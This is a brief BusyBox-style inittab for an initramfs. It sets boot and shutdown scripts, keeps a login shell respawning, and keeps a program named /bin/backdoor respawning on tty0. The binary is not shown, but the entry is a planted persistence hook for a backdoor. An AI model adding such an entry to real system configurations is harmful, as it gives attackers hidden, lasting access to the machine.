# initramfs/etc/inittab
::sysinit:/etc/init.d/rcS S boot
::shutdown:/etc/init.d/rcS K stop
::respawn:/bin/sh --login
tty0::respawn:/bin/backdoor
